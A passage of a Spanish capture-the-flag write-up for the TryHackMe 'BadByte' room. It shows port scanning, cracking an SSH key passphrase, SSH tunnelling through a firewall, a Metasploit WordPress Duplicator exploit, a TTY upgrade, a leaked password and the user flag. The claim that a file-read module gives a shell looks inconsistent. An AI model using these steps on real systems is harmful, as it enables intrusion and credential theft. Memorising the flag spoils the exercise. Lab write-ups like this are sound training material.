@@ -1,0 +1,142 @@
+TryHackMe
+BadByte
+
+Nmap
+
+	nmap -p- -sS -sC -sV --open -vvv -n -Pn 10.10.9.86 -oN nmap
+
+	• 22/tcp    open  ssh     syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+	• 30024/tcp open  ftp     syn-ack ttl 64 vsftpd 3.0.
+	| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+	| -rw-r--r--    1 ftp      ftp          1743 Mar 23  2021 id_rsa
+	| -rw-r--r--    1 ftp      ftp            78 Mar 23  2021 note.txt
+
+Después del escaneo de Nmap, podemos ver que el usuario "anonymous" tiene privilegios para "id_rsa" y "note.txt".
+
+Con "id_rsa" y "note.txt" en nuestro poder, procedemos a crackear la contraseña con John the Ripper.
+
+Primero hacemos que "id_rsa" se convierta en un hash.
+
+> ssh2john id_rsa > hash
+
+Ahora procedemos a crackearlo con John the Ripper.
+
+> john --wordlist=/usr/share/wordlists/rockyou.txt hash
+	> cupcake
+
+Ahora necesitamos un usuario, y dentro de "note.txt" encontramos un posible usuario: "errorcauser".
+
+Para utilizar "id_rsa", primero damos permisos.
+
+> chmod 600 id_rsa
+
+Ahora procedemos a intentar ingresar por el puerto SSH.
+
+> ssh -i id_rsa errorcauser@10.10.197.156
+	> password: cupcake
+
+Estamos dentro. Encontramos "note.txt" que contiene lo siguiente:
+
+> cat note.txt
+	Hi Error!
+	I've set up a webserver locally so no one outside could access it.
+	It is for testing purposes only. There are still a few things I need to do like setting up a custom theme.
+	You can check it out; you already know what to do.
+	-Cth
+:)
+
+Esto puede indicar que dentro del entorno que estamos atacando hay un puerto abierto que no está expuesto a la red externa, por lo tanto, toca hacer "Dynamic port forwarding". Para esto, necesitamos hacerlo de la siguiente forma:
+
+Primero realizamos un túnel SSH y así evitamos el firewall que nos impide ver los puertos internos.
+
+> ssh errorcauser@10.10.213.245 -i id_rsa -D 1337
+
+Ahora procedemos a modificar nuestro proxychain para que de forma local ingresemos por ese túnel creado.
+
+> nano /etc/proxychains4.conf
+	> socks4 127.0.0.1 1337
+
+De esta forma, al agregar esa línea al archivo de configuración, estás indicando a ProxyChains que utilice un proxy SOCKS4 en la dirección IP "127.0.0.1" (que se refiere a tu máquina local) y el puerto 1337 como punto de salida para todo el tráfico que pases a través de ProxyChains.
+
+Ahora solo queda utilizar la herramienta "proxychains" para volver a interactuar con el servidor víctima a través del túnel SSH ya creado.
+
+> proxychains nmap -sT -T5 -vvv 127.0.0.1 1337 2>/dev/null
+
+Ahora Nmap estará interactuando con el túnel SSH creado, lo que logrará evadir el firewall y darnos información que solo tendríamos de forma local en la red.
+
+Respuesta de Nmap:
+
+	• 22/tcp   open  ssh     syn-ack
+	• 80/tcp   open  http    syn-ack
+	• 3306/tcp open  mysql   syn-ack
+
+Como vemos, ahora tenemos 2 puertos que antes no vimos: el 80 HTTP y el 3306 MySQL.
+
+Procedemos a ver qué hay en el 80, pero no obtenemos respuesta. Primero tenemos que hacer lo siguiente.
+
+> ssh errorcauser@10.10.82.178 -i id_rsa -L 8000:127.0.0.1:80
+
+Ahora sí tenemos respuesta y vemos que es un sitio de WordPress. Por lo tanto, procedemos a buscar vulnerabilidades en plugins.
+
+Para esta situación, es mejor utilizar Nmap, ya que WP-Scan no nos encontró nada.
+
+> nmap -p 8000 --script http-wordpress-enum --script-args check-latest,search-limit=1500 127.0.0.1
+
+Ahora procedemos a buscar exploits para esos plugins.
+
+Buscando en Google, encontramos un exploit en Exploit-DB asociado a MetaSploit.
+
+>Código del exploit: CVE : CVE-2020-11738
+
+>searchsploit CVE-2020-11738
+
+Encontramos un exploit para utilizar:
+
+>
+Procedemos a utilizar el de MetaSploit, ya que me falta horas de práctica en esa herramienta.
+
+> #  Name                                            Disclosure Date  Rank    Check  Description
+   -  ----                                            ---------------  ----    -----  -----------
+   0  auxiliary/scanner/http/wp_duplicator_file_read  2020-02-19       normal  No     WordPress Duplicator File Read Vulnerability
+
+Procedemos a utilizar ese exploit.
+
+> use 0
+
+Ya al seleccionarlo, procedemos a configurarlo.
+
+> show options
+
+Y vemos que tenemos que configurar algunas cosas.
+
+> set rhost 127.0.0.1
+> set rport 8000
+> set lhost 10.18.112.21
+
+Y ahora lo iniciamos.
+
+> run
+
+Y ya estamos dentro.
+
+Indicamos que utilizaremos la shell bash.
+
+> bash/shell
+
+Ahora toca hacer el tratamiento de la TTY.
+
+> script /dev/null -c bash
+> reset xterm
+> export TERM=xterm
+> export SHELL=bash
+
+Ahora nos movemos con normalidad dentro del servidor. Encontramos la flag de usuario.
+
+user.txt
+THM{227906201d17d9c45aa93d0122ea1af7}
+
+Luego de buscar e intentar varias cosas, decidimos buscar los archivos asociados al usuario "cth" para poder ver si encontramos alguna contraseña.
+
+> find / -user 'cth' 2>/dev/null
+
+Nos arroja muchos resultados. El último "/var/log/bash.log" parece ser el indicado, ya que encontramos la contraseña del usuario "cth". La contraseña es "G00dP@$sw0rd2020". Al colocarla, nos da error, pero volviendo a ver el archivo bash.log, descubrimos que en efecto hizo cambio de contraseña. Como el archivo es de 2021, intuimos que
